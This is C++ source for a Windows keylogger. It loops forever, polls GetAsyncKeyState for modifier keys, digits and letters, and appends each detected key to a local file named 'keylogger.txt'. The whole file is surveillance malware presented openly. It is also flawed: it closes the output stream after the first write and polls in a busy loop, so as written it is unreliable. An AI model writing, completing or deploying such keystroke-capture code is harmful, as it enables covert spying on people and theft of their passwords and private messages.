#include <windows.h>
#include <fstream>

int APIENTRY WinMain(_In_ HINSTANCE hinstance, _In_opt_ HINSTANCE hprevinstance, _In_ LPSTR lpcmdline, _In_ int cmdshow) {
	std::ofstream arq;
	arq.open("keylogger.txt", std::ios::app);

	for (;;) {
		if (GetAsyncKeyState(VK_CONTROL)) {
			arq << "CONTROL" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x08)) {
			arq << "BACKSPACE" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x09)) {
			arq << "TAB" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x0C)) {
			arq << "Chave CLEAR" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x0D)) {
			arq << "ENTER" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x10)) {
			arq << "SHIFT" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x12)) {
			arq << "ALT" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x13)) {
			arq << "PAUSE" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x14)) {
			arq << "CAPS LOCK " << " : ";
			arq.close();
		}
		if (GetAsyncKeyState(0x30)) {
			arq << "0" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x31)) {
			arq << "1" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x32)) {
			arq << "2" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x33)) {
			arq << "3" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x34)) {
			arq << "4" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x35)) {
			arq << "5" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x36)) {
			arq << "6" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x37)) {
			arq << "7" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x38)) {
			arq << "8" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x39)) {
			arq << "9" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x41)) {
			arq << "A" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x42)) {
			arq << "B" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x43)) {
			arq << "C" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x44)) {
			arq << "D" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x45)) {
			arq << "E" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x46)) {
			arq << "F" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x47)) {
			arq << "G" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x48)) {
			arq << "H" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x49)) {
			arq << "I" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x4A)) {
			arq << "J" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x4B)) {
			arq << "K" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x4C)) {
			arq << "L" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x4D)) {
			arq << "M" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x4E)) {
			arq << "N" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x4F)) {
			arq << "O" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x50)) {
			arq << "P" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x51)) {
			arq << "Q" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x52)) {
			arq << "R" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x53)) {
			arq << "S" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x54)) {
			arq << "T" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x55)) {
			arq << "U" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x56)) {
			arq << "V" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x57)) {
			arq << "W" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x58)) {
			arq << "X" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x59)) {
			arq << "Y" << "\n";
			arq.close();
		}
		if (GetAsyncKeyState(0x5A)) {
			arq << "Z" << "\n";
			arq.close();
		}
	}

	return 0;
}